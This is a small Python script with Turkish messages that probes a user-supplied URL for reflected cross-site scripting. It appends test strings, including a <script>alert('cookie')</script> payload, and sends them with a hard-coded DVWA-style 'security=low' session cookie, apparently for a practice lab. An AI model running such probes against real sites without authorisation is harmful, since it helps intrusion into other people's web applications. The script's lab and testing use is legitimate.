import requests
#bu yazılım sahibi belirtilecek şekilde değiştirilebilir veya geliştirilebilir sadece, aksi takdirde dava açılır.
print("""

┌───── •✧✧• ─────┐
 -Yapımcı Mike adams 
└───── •✧✧• ─────┘
 tool v1.0
""")
urli=input("xss açıklı sitenin url giriniz: ")
header={"Cookie": "security=low; PHPSESSID=a0b29e43b154e8cf261c3a93686bdd94"}
xssl=["cookie","<h1>cookie","<script>alert('cookie')</script>"]
for payload in xssl:
    print(payload)
    url=urli+str(payload)
    sonuc=requests.get(url=url,headers=header)
    if str(payload) in str(sonuc.content):
        print("xss var, payloadlar: ",str(payload))
    else:
        print("HATA!, xss bulunamadı. Lütfen daha sonra tekrar deneyiniz.")
